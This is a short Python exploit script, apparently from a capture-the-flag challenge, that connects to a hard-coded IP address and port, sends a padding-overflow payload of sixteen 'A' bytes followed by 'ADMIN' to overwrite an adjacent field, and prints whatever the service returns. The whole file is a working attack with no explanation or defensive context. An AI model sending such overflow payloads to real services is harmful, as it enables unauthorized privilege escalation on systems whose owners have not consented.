import socket

HOST = "133.88.122.244"
PORT = 30788
PAYLOAD = b"A" * 16 + b"ADMIN\n"


def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.recv(4096)
        sock.sendall(PAYLOAD)

        chunks = []
        sock.settimeout(2)
        while True:
            try:
                data = sock.recv(4096)
            except TimeoutError:
                break
            if not data:
                break
            chunks.append(data)

    print(b"".join(chunks).decode("latin1", "replace"), end="")


if __name__ == "__main__":
    main()
